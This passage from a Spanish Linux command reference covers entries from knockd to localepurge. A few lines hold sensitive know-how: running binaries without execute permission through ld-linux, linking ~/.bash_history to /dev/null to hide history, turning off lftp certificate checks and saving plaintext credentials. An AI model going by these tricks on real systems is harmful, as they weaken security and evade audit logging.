    C+S+← ─ Pesstaña anterior.
    C+S+. ─ Mover a la derecha la pestaña.
    C+S+, ─ Mover a la izquierda la pestaña.
    C+S+enter ─ Nueva ventana.
    C+S+n ─ Crear marco nuevo.
    C+S+1 ─ Mover foco a la ventana 1 (2,3,...)
    C+S+l ─ Cambiar la distribución de las ventanas
La distribución de ventanas puede ser:
    Fat: Ventana arriba ocupando todo el ancho y las demás abajo una al lado de la otra.
    Grid: Todas las ventanas en una rejilla repartiendo el espacio entre todas.
    Horizontal: Todas las ventanas unas al lado de las otras.
    Stack: Las ventanas ocupando todo el marco.
    Tall: Ventana en la izquierda ocupando todo el alto y el resto a la derecha una encima de otra.
    Vertical: Ventanas todas apiladas unas encima de otras.


kmod
Mostrar módulos del kernel.
# kmod list


knockd
El port knocking o golpeo de puertos es un mecanismo mediante la cual el cortafuegos, que mantiene cerrado un determinado puerto, detecta una secuencia preestablecida que procede de una conexión externa y abre dicho puerto para que el servicio asignado sea accesible. Este mecanismo permite añadir una capa adicional de seguridad [por oscuridad], de manera que para cualquier conexión externa no autorizada los puertos donde se brindan los servicios se muestran como cerrados, eliminando así la posibilidad de intentar la conexión y no ofreciendo información sobre el servicio configurado. Por su parte, el usuario autorizado necesita disponer de un cliente de port-knocking que envíe una secuencia de paquetes dirigidos a dicho puerto, con el fin de que el cortafuegos detecte la secuencia correcta y abra el puerto dejando accesible el servicio. Una vez desactivada esta capa de seguridad, el servicio está accesible para realizar ls conexión [por ejemplo SSH]. La aplicación precisa estar instalada en el servidor y en el cliente.
Habilitar el servicio y especificar la red:
# nano /etc/default/knockd
	START_KNOCKD=1
	KNOCKD_OPTS="-i eth0"
Configurar las opciones de loging y las secuencias que queremos usar:
# nano /etc/knockd.conf
	[options]
	        UseSyslog
	[openSSH]
	        sequence    = 7000,8000,9000
	        seq_timeout = 5
	        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	        tcpflags    = syn
	[closeSSH]
	        sequence    = 9000,8000,7000
	        seq_timeout = 5
	        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	        tcpflags    = syn
* UseSyslog (que envía los logs a /var/log/syslog. Si se desea un fichero de log propio, se utiliza LogFile=/var/log/knockd.log)
* sequence (especifica la secuencia de puertos y tipo de paquete a enviar para hacer el portknocking (por defecto TCP, pero se puede especificar una secuencia más compleja como sequence=2140:udp,4500:tcp,3025:udp)
* seq_timeout (especifica el periodo máximo de tiempo en segundos en el que la secuencia completa es recibida como secuencia válida)
* tcpflags (especifica los flags que deben ser tenidos en cuenta (fin|syn|rst|psh|ack|urg).
* command (especifica el comando a ejecutar cuando se reconoce la secuencia definida)
* %IP% (toma del valor de la ip cliente desde la que se envía la secuencia de puertos)
Con esta configuración, el servidor knockd escucha permanentemente todos los puertos, esperando una secuencia válida. Si recibe paquetes TCP dirigidos a los puertos 7000, 8000 y 9000, en este mismo orden y dentro de un intervalo de 5 segundos, reconoce la directiva [openSSH] y ejecuta iptables para abrir el puerto 22 [donde escucha sshd] a la IP que solicita la conexión. Ahora el cliente SSH puede realizar la conexión, y podemos cerrar el puerto de nuevo con la directiva [closeSSH] manteniendo establecida dicha conexión.
# service knockd start (Iniciar el servicio)
Probar el servicio en local:
Parar knockd si está activo y levantarlo manualmente:
# service knockd stop
# knockd -v -i lo
En otra terminal:
$ knock -v localhost 7000 8000 9000
Cuando queramos terminar la conexión:
$ knock -v localhost 9000 8000 7000
En la terminal del servidor veremos algo como:
# knockd -v -i lo
	listening on lo...
	127.0.0.1: openSSH: Stage 1
	127.0.0.1: openSSH: Stage 2
	127.0.0.1: openSSH: Stage 3
	127.0.0.1: openSSH: OPEN SESAME
	openSSH: running command: /sbin/iptables -A INPUT -s 127.0.0.1 -p tcp --dport 22 -j ACCEPT
	127.0.0.1: closeSSH: Stage 1
	127.0.0.1: closeSSH: Stage 2
	127.0.0.1: closeSSH: Stage 3
	127.0.0.1: closeSSH: OPEN SESAME
	closeSSH: running command: /sbin/iptables -D INPUT -s 127.0.0.1 -p tcp --dport 22 -j ACCEPT
Si en la configuración de iptables tenemos acceso a conexiones ya establecidas:
	iptables -A INPUT -p tcp -m tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
Podemos configurar la aplicación para que se cierre de forma automática:
# nano /etc/knockd.conf
	[opencloseSSH]
	        sequence = 7000,8000,9000
	        seq_timeout = 5
	        tcpflags = syn
	        start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	        cmd_timeout = 25
	        stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp  --dport 22 -j ACCEPT


knocker
Para detectar sistemas operativos y revisar puertos de servidores remotos.
# knocker -H IP_o_host -SP 1 -EP 1024
-SP (Indica el puerto de inicio del escaneo)
-EP (Indica el puerto final)


komichi
Navegador minimalista escrito en python y pyqt4 con soporte para pestañas, flash y atajos de teclado. Descarga de http://es.sourceforge.jp/projects/sfnet_komichi/releases/
Algunos atajos:
Ctrl + t (Nueva pestaña)
Ctrl + b (Marcadores)
Alt + p (Configuracion [pagina de inicio, javascript, plugins...])
F1 (Abrir archivo README)
Ctrl + Mayus + t (Abrir ultima pestaña cerrada)
F5 (Recargar pagina)
Ctrl + o (Abrir)
Ctrl + k (Buscar)
Ctrl + l (Entrar url)
Ctrl + s (Guardar la pagina)
Ctrl + f (Buscar en la pagina)
Ctrl + g (siguiente entrada de la busqueda)
Ctrl + + (Aumentar zoom)
Ctrl + - (Disminuir zoom)
Ctrl+ 0 (Visualizacion por defecto)
Ctrl + h (History)
Ctrl + Mayus + del (Borrar history)
Ctrl + Mayus + n (Entrar en modo privado)
Ctrl + d (Entrar pagina en los marcadores)


kpsewhich
Herramienta utilizada en sistemas TeX [como LaTeX] para localizar archivos específicos, como una clase [.cls] o un paquete [.sty] dentro del árbol de directorios de TeX y expandir rutas de manera independiente en el sistema.
$ kpsewhich beamercolorthemefly.sty (devolverá la ruta completa al archivo especificado en el sistema)
$ kpsewhich cmr10.tfm (encontrará el archivo cmr10.tfm, que pertenece a la familia Computer Modern Roman)
$ kpsewhich --expand-var '$TEXMF' (mostrará el valor expandido de la variable $TEXMF, que apunta al directorio principal de archivos de TeX)
$ kpsewhich texmf.cnf (devuelve la ubicación del archivo de configuración texmf.cnf que contiene variables y rutas)
$ kpsewhich example.pdf (ver dónde se ha generado un archivo de salida [como un .pdf o .log])
$ kpsewhich --format='TeX system documentation' file.txt (limitar la búsqueda a tipos específicos de archivos. Por ejemplo, para buscar solo archivos de ayuda [.doc o .txt])


kvm-ok
[check-bios-nx]. Comprobar si la CPU  tiene soporte para extensiones KVM.
# kvm-ok
INFO: Your CPU does not support KVM extensions
KVM acceleration can NOT be used


kwin
[kde-window-manager]. Gestor de ventanas
$ kwin --replace (Activar kwin)


lame
Cambiar formatos de audio
$ lame -h -m j tema.wav tema.mp3  (Pasar de wav a mp3)
$ lame -h -m j --nogap *.wav (Pasar lote de wav a mp3)
$ lame -h --decode tema.mp3 tema.wav     (Pasar de mp3 a wav)
$ for i in *.mp3; do lame -q 0 -b 160 -m j "$i" "directorio/$i"; done (Modificar el bitrate (-b 160) de todos los mp3 de “directorio”)
-q 0	Opciones de 0 a 9. A menor calidad, mayor velocidad de conversión.
-m j	Activar joint stereo.


laptop-detect
Detecta si nos encontramos en un portatil. Retorna "0" si lo más probable es que si, "1" si probablemente es que no y "2" si es una opción desconocida.
$ laptot-detect -v


last
Muestra la ultima vez que se conecto un usuario [/var/log/wtmp].
$ last -n 10 (Muestra los últimos 10 eventos. )
$ last reboot (la útima vez que se reinició)
$ last -i (Mostrando la ip)
$ last tty1 (que lo hizo a la tty1)
$ last usuario (que se conectó “usuario”)
$ last -f /media/sda2/var/log/wtmp (Analizar el acceso de otro sistema)


lastb
Muestra los intentos de conexión fallidos (/var/log/btmp)
# lastb   -20 (Muestra los últimos 20 intentos fallidos en logearse)


lastcomm
[acct)]. Muestra información acerca de comandos ejecutados y terminales abiertas.
$ lastcomm tmux tty1 (sólo muestra los epecificados)
$ lastcomm root (Del usuario root)


lastlog
Ver el momento exacto que los usuarios han entrado por última vez
$ lastlog -u usuario  (solo ver a "usuario")


latex
[texlive texlive-lang-spanish]. Sistema de composición de textos, orientado especialmente a la creación de libros, documentos científicos y técnicos que contengan fórmulas matemáticas. La elaboración del documento requiere normalmente de dos etapas: en la primera hay que crear mediante cualquier editor de texto llano un fichero fuente que, con las órdenes y comandos adecuados, contenga el texto que queramos imprimir. La segunda consiste en procesar este fichero; el procesador de textos interpreta las órdenes escritas en él y compila el documento, dejándolo preparado para que pueda ser enviado a la salida correspondiente. LaTeX ofrece siempre la misma salida, con independencia del dispositivo (impresora, pantalla, etc.) o el sistema operativo (MS Windows, MacOS, Unix, GNU/Linux, etc.) y puede ser exportado a partir de una misma fuente a numerosos formatos [Ps, PDF, SGML, HTML, RTF, etc.]. Otra ventaja de LaTeX es que calcula la cantidad óptima de caracteres por línea para optimizar la lectura, 66 por defecto. Existen miles de instrucciones. Aquí una pequeña muestra para no morir en el intento.
A continuación una estructura elemental de un documento:
Los comentarios van precedidos por el signo de porcentaje [%]
La primera linea puede especificar el papel [A4], tamaño de la letra [10pt, 11pt, 12pt], tipo de texto [article, report, book, letter, slides...], cantidad de columnas [twocolumn]:
	\documentclass[a4paper, 12pt]{article}
	\documentclass[12pt,twocolumn]{report}
Activar el soporte Unicode [para  dieresis, eñes...]
	\usepackage[utf8]{inputenc}
	\usepackage[spanish]{babel}
Especificar título, autor, fecha. "date", si no se especifica, pone la fecha actual:
	\title{Lorem Ipsum}
	\author{La Pipa Plena}
	\date{ }
El cuerpo del documento se inicia con \maketitle
Inicio y final de texto. Entre párrafos ha de dejarse una linea en blanco. El primer párrafo de una subsección, sección o capítulo no está sangrado, pero los restantes sí.:
	\begin{document}
	Est et quia non voluptatum. Aspernatur facilis excepturi aut. Voluptatem perspiciatis id cum ab nostrum. Qui rerum nisi vitae quae. Quam consequatur eaque minima ipsum distinctio.
	\end{document}
Secciones y subsecciones del texto:
	\section{Introducción}
	\section{Historia}
	\subsection{Historia inicios}
	\subsection{Historia continuación}
Formatos de texto:
	\textbf{texto en negrita}
	\emph{destaca el texto}
	\textit{texto en cursiva}
	\underline{texto subrayado}
	\textsc{texto en versalita}
Tamaño de la letra. Estos comandos afectan a todo el texto que les sigue mientras no se modifique nuevamente y sin necesidad de encerrarlo entre llaves. De más pequeña a más grande: tiny, scriptsize, footnotesize, small, normalsize (la normal), large, Large, LARGE, huge, Huge
Centrar un párrafo:
	\begin{center}
	Est et quia non voluptatum. Aspernatur facilis excepturi aut. Voluptatem perspiciatis id cum ab nostrum. Qui rerum nisi vitae quae. Quam consequatur eaque minima ipsum distinctio.
	\end{center}
alinear texto:
	\centering {Texto a centrar}
	\raggedleft {Texto a la derecha}
	\raggedright {Texto a la izquierda}
Colocar código:
	\begin{verbatim}
	trozo de código
	\end{verbatim}
Para confeccionar un documento en latex puede usarse cualquier editor [vim, nano, gedit...] y para convertirlo a pdf compilarlo con:
$ pdflatex texto.tex
Tambien podemos visualizar directamente el .dvi con la aplicación evince o usar gummi que, al tener la pantalla dividida en dos partes, permite crear el documento y visualizarlo en tiempo real.


latex2html
Covierte un archivo latex a formato html. Crea un directorio con el mismo nombre del archivo.
$ latex2html archivo.tex
$ latex2html -dir DIR archivo.tex (Creará los archivos html en el directorio especificado [tiene que existir])
$ latex2html -html_version 4.0,latin1,unicode archivo.tex (Para que respecte acentos)


lazygal
Generar una galería web.
$ lazygal directorio_con_las_imagenes  (Creará todos los archivos en el presente directorio por lo que es preferible estar en un directorio vacio)
$ lazygal -o /var/www/ /home/usuario/fotos (Lo creará en la carpeta web a partir del directorio fotos)


lckdo
[moreutils]. Bloquea la ejecución de un programa con el fin de evitar que otros procesos se ejecuten en paralelo. Se utiliza como nice [ver] y nohup [ver]


ld-linux
Libreria que permite ejecutar binarios del sistema sin permiso de ejecución siempre que tengan activado el permiso de lectura. Según se trate de 32 bits o 64, la libreria será: /lib/ld-linux.so.2 o /lib64/ld-linux-x86-64.so.2. Solo funciona con binarios no con scripts.
	# chmod -x /bin/ls
	# ls
	bash: /bin/ls: permiso denegado
	# /lib64/ld-linux-x86-64.so.2 /bin/ls
	a.jpg  b.jpg  captures  guia-sed.pdf ...


ldconfig
Se utiliza para crear, actualizar y eliminar enlaces simbólicos para las bibliotecas compartidas actuales basándose en los directorios de bibliotecas presentes en el directorio /etc/ld.so.conf
# ldconfig -p (Cantidad de directorios y bibliotecas que están almacenadas en la cache /etc/ld.so.cache y los enumera a continuación)
# ldconfig -v (Escanea todos los directorios e imprime el nombre del directorio y todos los enlaces que se crean bajo él)


ldd
Para conocer las librerias compartidas que usa una aplicación.
$ ldd /usr/bin/amarok


leafpad
Editor tipo gedit.
Configuración de parámetros:
$ nano .config/leafpad/leafpadrc
	0.8.18.1
	1215 (Ancho)
	363 (Alto)
	Monospace 12 (Fuente y medida)
	1 (Ajustar / desajustar lineas al ancho de la ventana [0 o 1])
	0 (Mostrar / esconder número de linea [0 o 1])
	0
Atajos:
	Ctrl-n (Documento nuevo)
	Ctrl-o (Abrir)
	Ctrl-s (Guardar)
	Shift-Ctrl-s (Guardar como)
	Ctrl-w (Cerrar documento)
	Ctrl-p (Imprimir)
	Ctrl-q (Salir)
	Ctrl-z (Borrar última palabra escrita)
	Ctrl-y (Deshacer "borrar última palabra")
	Ctrl-x (Cortar)
	Ctrl-c (Copiar)
	Ctrl-v (Pegar)
	Ctrl-a (Seleccionar todo el texto)
	Ctrl-f (Buscar en el texto)
	Ctrl-g [F3] (Siguiente busqueda)
	Shift-Ctrl-g [Shift-F3] (Busqueda anterior)
	Ctrl-h [Ctrl-R] (Reemplazar palabras del texto por otras)
	Ctrl-j (Saltar a la linea...)
	Ctrl-t (Siempre en primer plano)


less
Pagina la visualización de un fichero.
$ cat /etc/apt/sources.list | less
$ less fichero
Atajos:
	espacio (Avanzar un número de líneas igual al número de líneas de la pantalla)
	enter (Avanzar de línea en línea)
	y (Retroceder una línea)
	G (Ir al final del texto)
	g (Ir al inicio del texto)
	/ (Ingresar palabra a ser buscada de la página actual al final del texto)
	? (Ingresar palabra a ser buscada de la página actual al inicio del texto)
	n (Ir a la siguiente coincidencia de búsqueda)
	AvPág (Avanzar una pantalla de texto)
	RePág (Retroceder una pantalla de texto)
	v (Abrir lo que se visualiza con el editor. Por defecto vi)
	h (Ayuda)
	q (Salir del programa)


lessfile
Programa que modifica la forma en que se muestra los contenidos de un archivo el comando less, lo que significa es que less podrá abrir automáticamente archivos tar, tar.bz2, gzip, bz, 7z, pdf, jar, deb, iso e incluso mostrar características básicas de archivos gráficos tipo .gif, .png, .jpg, .tif, etc.  Colocar en ~/.bashrc una de las siguientes lineas:
    eval "$(lessfile)"
    eval "$(lesspipe)"
Actualizar el archivo:
    $ source ./.bashrc
Antes de actualizar .bashrc si se lanza.
$ less archivo.rar (mostrará caracteres raros)
Después de actualizar .bashrc mostrará el contenido del archivo.


lesspipe
Exactamente igual que lessfile [ver]


let
Permite asignar el resultado de una expresión aritmética a una variable.
$ let a=4*3; echo $a
Ejemplo en un script:
	#!/bin/bash
	read -p "Dime dos número del 1 al 100: " NUM1 NUM2
	let SUMA=$NUM1+$NUM2
	echo "La suma de $NUM1 + $NUM2 es $SUMA"
let permite utilizar asignaciones:
	incremento +=
	decremento -=
	mutiplicar por *=
	dividir por /=
	modulo por %=
	incremento en 1 ++
	decremento en 1 --
Ejemplo:
	#!/bin/bash
	let x=1
	let x+=1
	echo $x


lf
lf ("list files") es un administrador de archivos escrito en Go. Está inspirado en gran medida por ranger [ver] con algunas características extra y algunas que faltan. Puede encontrarse en <https://github.com/gokcehan/lf>


lfm
Administrador de archivos
$ lfm -1 (arrancar con un solo panel)
$ lfm -2 (arrancar con dos [por defecto])
$ lfm /home/usuario/Documentos /media/sda2 (Abrir en cada panel un directorio)
Nota.- Pulsar “q” para cerrar


lftp
Conexión ftp por linea de comandos.
$ lftp usuario@host
# lftp -help  (Para obtener ayuda)
# lftp -u usuario,clave ftp.dominio.com (Conectar con un servidor de FTP)
Nota.- entrados en el directorio raiz del servidor ftp remoto el prompt adquiere un estilo:
# lftp usuario@ftp.dominio.com:~>
Algunas de las opciones que tenemos en el host remoto son las mismas que podemos emplear en bash:
	mkdir, mv, ls, rm, exit, cat, more, chmod, pwd...
Algunas opciones específicas:
~> get archivo (Bajar un archivo del remoto al local)
~> mget dir (Bajar un directorio del remoto al local)
~> put archivo  (Subir un archivo del local al remoto)
~> mput dir (Subir un directorio del local al remoto)
~> mirror dir  (copiará el contenido de htdocs (remoto) a la carpeta donde estemos en local.
~> help mirror (opciones de mirror)
~> exit   (salir del remoto)
~> !ls (listará el directorio local)
~> !mkdir dir (crear un directorio en local)
~> !pwd (En què directorio nos encontramos en local)
1.-
Resolver la nota "Fatal error: Certificate verification: Not trusted" que informa que el cliente no puede verificar la autenticidad del certificado que esta ofreciendo el servidor. Se ignora el error con:
	set ssl:verify-certificate no
Para no tener que colocar la linea cada vez que nos conectamos, podemnos crear el archivo ./lftp/rc i colocarla en él.
2.-
Para no entrar cada vez nombre de usuario ni contraseña y además tener un alias para la conexión [servidor], podemos crear el archivo ./lftp/bookmarks y colocar la linea:
	servidor	ftp://USER:PASS@HOST
La conexión se realizarà con:
$ lftp servidor


lha
Compresor/descompresor de archivos.
$ lha -a archivo.lha ficheros (Comprimir)
$ lha -x archivo.lha (Descompimir)
$ lha -v archivo.lha (Ver el contenido)


libaa-bin
Biblioteca de gráficos artísticos ASCII. Comprende los ejecutables: aafire [ver], aainfo, aasavefont y aatest
$ aainfo
$ aatest


libcap-ng-utils
Este paquete contiene utilidades para analizar y configurar las capacidades de los archivos. Incluye las aplicaciones: captest, filecap, netcap  y pscap [imprimen un informe de las capacidades del proceso]
# netcap
# pscap
# captest
# filecap


libnetcfg
Libnet es una API que ayuda con la construcción e inyección de paquetes de red de bajo nivel. La utilidad libnetcfg se puede utilizar para configurar libnet.
$ libnetcfg


libpam-tmpdir
Muchos programas usan $TMPDIR para almacenar archivos temporales. No todos son buenos para asegurar los permisos de esos archivos. libpam-tmpdir establece $TMPDIR y $TMP para sesiones PAM y establece los permisos bastante estrictos. Esto ayuda a la seguridad del sistema al tener una capa adicional de seguridad, lo que hace que tales ataques de enlaces simbólicos y otros ataques basados en tmp sean más difíciles o imposibles. El módulo pam_tmpdir, invoca pam-tmpdir-helper para crear un directorio temporal seguro para el usuario que lo invoca. No es dañino llamarlo a mano, pero no dará ningún diagnóstico ni mensaje de error aparte de su valor de retorno. Se registra en syslog.
$ pam-tmpdir-helper


libreoffice
[myspell-ca myspell-es]
Suite ofimática. Ver lo..
1.-
Cambiar de pantalla de inicio
$ wget http://gnome-look.org/CONTENT/content-files/140076-libreoffice_splash.tar.gz
$ tar -zxvf 140076-libreoffice_splash.tar.gz
# cp about.png intro.png /usr/lib/libreoffice/program/
En el archivo readme.txt se especifica el último paso:
Modificar el archivo /etc/libreoffice/sofficerc con siguientes parámatros:
	[Bootstrap]
	HideEula=1
	Logo=1
	NativeProgress=true
	ProgressBarColor=78,158,1
	ProgressFrameColor=45,45,45
	ProgressPosition=60,277
	ProgressSize=320,6
Atajos (write)
	Ctrl+Inicio (Ir al inicio del documento)
	Crtl+Fin Ir al final del documento)
	Ctrl+u (Subrayado)
	Ctrl+i (cursiva)
	Ctrl+b (negrita)
	Ctrl+e (texto centrado)
	Ctrl+l	 (texto alineado a la izquierda)
	Ctrl+m (Formateado de fuente por defecto)
	Ctrl+a (seleccionar todo el texto)
	Ctrl+s (Guardar documento)
	F7 (Ortografia y gramatica)


libwacom-list-local-devices
Utilidad para listar los dispositivos conectados e identificados por libwacom. libwacom es una biblioteca para identificar tabletas gráficas las características específicas de cada modelo. Facilita el acceso a información como si es una tableta integrada en la pantalla, cuál es el tamaño de este modelo, etc. Originalmente estaba diseñado sólo para dispositivos Wacom pero ahora soporta cualquier tableta gráfica de cualquier proveedor. . Normalmente se utiliza para comprobar si un archivo de datos libwacom  es correcto, está presente y/o se aplica a un dispositivo específico.
$ libwacom-list-local-devices


liferea
Lector RSS.
Atajos:
	Ctrl + u (Actualizar todos los feeds)
	Ctrl + r (Marcar feed como leído)
	Ctrl + n (Ir al siguiente feed no leído)
	u (Subir por los feeds)
	d (Bajar por los feeds)
	b (Moverse del feed a la noticias)
	f (Bajar por las noticias)
	Espacio (Abrir la noticia en el navegador)


lightdm
Gestor de sesiones.
1.-
Suprimir la cuenta de invitado:
# nano /etc/lightdm/lightdm.conf
Añadir la linea:
allow-guest=false
# restart lightdm (Reiniciar servicio)
2.-
Entrar de forma automática:
 - Para versiones modernas:
Crear fichero /etc/lightdm/lightdm.conf.d/12-autologin.conf
# nano /etc/lightdm/lightdm.conf.d/12-autologin.conf
Insertar estas 3 líneas editando USUARIO por tu usuario:
[Seat:*]
autologin-user=USUARIO
autologin-user-timeout=0
 - En versiones antiguas
# nano /etc/lightdm/lightdm.conf
autologin-user=USUARIO
autologin-user-timeout=0
3.-
Para modificar la sesión por defecto:
# nano /usr/share/xsessions/lightdm-xsession.desktop
Y colocar en la linea Exec el deseado:
	[Desktop Entry]
	Version=1.0
	Name=Default Xsession
	Exec=mate-session
	Icon=
	Type=Application


light-locker-command
Protector de pantalla.
$ light-locker-command -t 3 (que se ejecute a los 3 minutos)
$ light-locker-command -l (imediatamente)
$ light-locker-command -d (desactivarlo)


lilo
Gestor de arranque. La configuración en:
# nano /etc/lilo.conf
Algunos parametros a especificar:
# Indica que se instale en determinado disco:
boot = /dev/sda
# El sistema que arrancará por defecto [el especificado en la etiqueta [label]]
default = Linux
# Que muestre cualquier cosa que sea referenciado en la línea message:
prompt
# Una imagen. Medidas 640x480:
bitmap = /boot/slack.bmp
# un mensaje de inicio:
message = /boot/boot_message.txt
# tiempo de espera para arrancar la partición por defecto [en segundos]:
timeout = 50
# Una partición linux
image = /boot/vmlinuz
	root = /dev/sda2
	label = Linux
	read only
# nota: read-only Indica que el sistema de ficheros raíz se montará en modo solo-lectura.
# Por norma general, el proceso de arranque lo remonta luego en modo lectura-escritura.
# Una partición windows:
other = /dev/hda1
    label = Windows
    table = /dev/sda1
Si queremos una contraseña para entrar en alguno de los sistemas colocamos en su entrada:
	password = 12345
Cualquier modificación en este archivo para guardar los cambios, implica lanzar:
# lilo


lilypond-doc-html-es
Documentación HTML en español del software de composición tipográfica de música lilypond. Acceder con el navegador a la dirección:
	file:///usr/share/doc/lilypond/html/Documentation/changes/index.es.html


lilyterm
Emulador de terminal.
$ lilyterm -g 90x10 -T terminal -t 3 -d /home/usuario (Con determinadas medidas, título, 3 pestañas y abriendo en las tres un directorio)
Algunos atajos:
	Ctrl + t (Abrir nueva pestaña)
	Ctrl + d (Cerrar pestaña)
	Ctrl + RePag (Ir a pestaña anterior)
	Ctrl + AvPag (Ir a pestañas siguiente)


line
Utilidad que copia una línea desde el inicio hasta el final desde la entrada estándar a la salida estándar.  Siempre imprime al menos una nueva línea y devuelve un estado de salida distinto de 0 en EOF o error de lectura
	$ line
	linux es genial
	linux es genial
	---------------
	$ echo $?
	0
	---------------
	$ line
	^C
	---------------
	$ echo $?
	130
	---------------
	$


link
Crear enlaces entre ficheros.
$ link fichero1 fichero2 (crea un enllace fichero2 que apunta a fichero 2)


links2
Navegador.
# links2 -driver fb -g web.com (modo gráfico en el las tty con framebuffer)
Atajos
	g (Especificar dirección URL a cargar)
	z (Retroceder en el historial, ir a la página anterior)
	Ctrl + r (Recargar la página)
	s (Administrar marcadores)
	Ctrl + s (Detener todas las conexiones)
	q (Salir del programa)
	/ (Buscar un texto en la página, a partir de la posición actual)
	? (Buscar un texto en la página, desde la posición actual)
	n (Ir a la coincidencia de búsqueda siguiente)
	N (Ir a la coincidencia de búsqueda anterior)
	\ (Alternar entre texto sin formato y HTML)
	= (Ver información de la página)
	| (Ver información de cabecera. Etiquetas META del HTML))
	f (Ver marco (frame) actual en pantalla completa)
	c (Copiar dirección URL del enlace actual)
	d (Descargar contenido del enlace actual)
	i (Ver imagen del enlace actual si el enlace apunta a una imagen)
	I (Descargar imagen del enlace actual si el enlace apunta a una imagen)


lintian
Muestra fallos en construcción de paquetes .deb [según la política de Debian]. Puede que algunos “warnings” [W] y “errores” [E] solo significan que el paquete no sigue los estandares marcados pero no afectan a su ejecución:
$ lintian paquete.deb


linux-boot-prober
Intentará averiguar cómo arranca la partición raíz especificada.
          # linux-boot-prober /dev/sda1
          /dev/sda2:/dev/sda1:Linux:/vmlinuz:/initrd.gz:root=/dev/sda1


linux-check-removal
Comprobar si la eliminación de un kernel es segura. está pensado para ser llamado desde los scripts prerm maintainer de los paquetes del núcleo Linux. Los scripts preinst, postinst, prerm y postrm de Debian son scripts que se ejecutan automáticamente antes o después de instalar o eliminar un paquete.
# linux-check-removal 5.10.0-8-amd64 (si se quiere eliminar manualmente un kernel viejo)


linux-update-symlinks
Como linux-check-removal está pensado para ser llamado desde los scripts postinst y postrm maintainer de los paquetes del núcleo Linux. El script postinst debe pasar el primer argumento  install o upgrade dependiendo de si se ha realizado una nueva instalación o una actualización.
# linux-update-symlinks upgrade 6.1.0-10-amd64


linuxinfo
Muestra información del sistema: versión del kernel, número y tipo de procesadores, versión de la biblioteca del sistema (libc o glibc).
$ linuxinfo


linuxlogo
Muestra datos de la cpu junto al logo de distintas distros. Listado en /etc/linux_logo.conf
$ linuxlogo -a (En monocromo ascii)
$ linuxlogo -b (tipo banner)
$ linuxlogo -L ubuntu (De una distro concreta)
$ linuxlogo -L randon_xy (logo aleatorio dentro de los disponibles en /etc/linux_logo.conf)
$ linuxlogo -L random_ba (aleatorio y en ascii)
$ linuxlogo -L redhat -F "Redhat linux 5.2\nkernel version 3.2.0-4-amd64" (Especificando logo y texto)


linux-version
Muestra los kernels instalados en el sistema.
$ linux-version list (los lista todos)
$ linux-version list | linux-version sort --reverse (lista los kernels y ordena del más nuevo al más viejo)


liquidprompt
Ofrece un promt modificado con información y coloreado.
$ source /usr/share/liquidprompt/liquidprompt (activarlo al momento de instalar)
$ liquidprompt_activate (crea entrada en .bashrc)
$ liquidprompt_on (activarlo)
$ liquidprompt_off (desactivarlo)
$ lp_theme --list (listado de temas)


listres
Genera una lista de la base de datos de recursos de un widget. La lista muestra la clase en la que se define por primera vez cada recurso, el tipo y la instancia. Si no se proporcionan widgets específicos se imprimirá una lista de nombres de widgets y sus jerarquías de clase.
$ listres -all (todos)
$ listres -variable core (que los widgets se identifiquen por los nombres de las variables de registro de clase)


listserialportsc
Listar los puertos serie del pc. La salida contiene campos vid/pid/iserial.
$ listserialportsc


lmbench
Herramienta para probar el rendimiento de un sistema. La primera vez que se ejecute hará varias preguntas [las opciones por defecto son suficientes] y algunos chequeos. Su ejecución lleva bastante tiempo.
# lmbench-run


ln
Cear enlaces de archivos o carpetas
$ ln -s /home/ct/videos /home/Desktop/videos (Crea un enlace a videos en Desktop)
$ ln -f (Borra los ficheros de destino si ya existen)
$ ln -i (Pregunta antes de borrar ficheros de destino existentes)
$ ln -s /dev/null ~/.bash_history  (vincular historial a /dev/null)
$ ln -sf /opt/metasploit/msf* /usr/bin (Crear un enlace a /usr/bin de todos los ejecutables que empizan por msf del directorio /opt/metasploit)


lnav
Visor avanzado de archivos de registro normalmente situados en /var/log/.
# lnav /var/log/ (sobre todos los logs del sistema)
# lnav /var/log/syslog (sobre un log concreto)
# lnav -r /var/log/auth.log (incluir archivos comprimidos en la salida)
# lnav /var/log/auth.log -d auth.txt (mandar la información de depuración a un archivo)
Algunas teclas de control:
    e (saltar al mensaje de error siguiente)
    w (saltar al mensaje de advertencia siguiente)
    b (página anterior)
    Espacio (página siguiente)
    g (moverse a la parte superior/inferior de la página)
    p (detalle del log del cursor)
    G (salir)


lnstat
Proporciona estadísticas de redes. Es un sustituto del antiguo programa rtstat.
# lnstat -c 3 (realiza 3 muestras)
# lnstat -d (Lista de opciones)
# lnstat -k entries (Muestra solo esta opción)
# lbstat -i 2 (2 segundos entre muestra y muestra)


lo
Abrir documentos o herramientas de libreoffice
$ lowriter -o archivo.odt
$ lowriter --convert-to pdf:writer_pdf_Export --outdir /home/USER/dir dotemacs (Pasar el archivo dotemacs a pdf y colocarlo en el directorio "dir")
$ loffice --headless --convert-to odt:"writer8" archivo.docx (Convertir un docx a odt)
$ loffice --infilter="writer_pdf_import" --convert-to doc archivo.pdf (pasar un pdf a doc)
$ localc --headless --convert-to txt:"Text - txt - csv (StarCalc)" archivo.xlsx (Convertir un xls a txt)
$ localc --convert-to pdf archivo.ods (convertir a pdf un ods)
$ localc -o archivo.ods
$ lomath -o archivo.odf
$ lodraw -o archivo.odg
$ loimpress -o archivo.odp
$ loweb -o archivo.html


loadkeys
Modificar la distribución del teclado. Afecta a las tty. Para las X el comando es setxkbmap.
# loadkeys es
# loadkeys /usr/share/kbd/keymaps/i386/qwerty/es.map.gz
Nota.- Para encontrar la ruta al mapa de teclado:
# find / -iname es.map*


locale
Información sobre los idiomas del sistema
$ locale -a  (muestra los idiomas disponibles)
$ locale -m (mapas de caracteres que tenemos en el sistema)
$ locale | grep LANG=  (muestra el idioma por defecto)
$ locale (Muestra los idiomas actualmente en uso)
En  algunas distros [Arch] es preciso crear el archivo:
# nano /etc/locale.conf
Y añadir el idioma escogido:
LANG="es_ES.UTF-8"
El idioma tiene que estar descomentado en /etc/locale.gen y luego generado por locale-gen


localectl
Controlar la configuración regional del sistema y la distribución del teclado
$ localectl status
$ localectl list-locales


locale-gen
Reconfiguración automática de los locales
$ locale-gen


localepurge
Elimina e impide la instalacion de los paquetes de idiomas y páginas man que no hemos escogido.
# localepurge
En arch:
# nano /etc/locale.nopurge
